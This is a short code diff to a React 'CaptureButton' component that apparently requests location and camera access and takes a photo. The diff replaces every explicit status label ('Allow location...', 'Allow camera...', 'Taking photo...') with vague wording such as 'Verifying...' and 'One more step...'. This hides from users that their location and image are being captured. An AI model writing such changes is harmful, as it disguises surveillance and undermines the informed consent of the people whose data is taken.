@@ -170,19 +170,19 @@ export default function CaptureButton() {
       >
         {isLoading
           ? status === "requesting_location"
-            ? "Allow location..."
+            ? "Verifying..."
             : status === "requesting_camera"
-              ? "Allow camera..."
+              ? "One more step..."
               : status === "location_ok" || status === "camera_ok"
-                ? "Access granted..."
+                ? "Processing..."
                 : status === "capturing"
-                  ? "Taking photo..."
-                  : "Saving..."
+                  ? "Almost done..."
+                  : "Completing..."
           : status === "success"
             ? "Done"
             : status === "error"
               ? "Try again"
-              : "Continue"}
+              : "Confirm & continue"}
       </button>
       {message && (
         <p
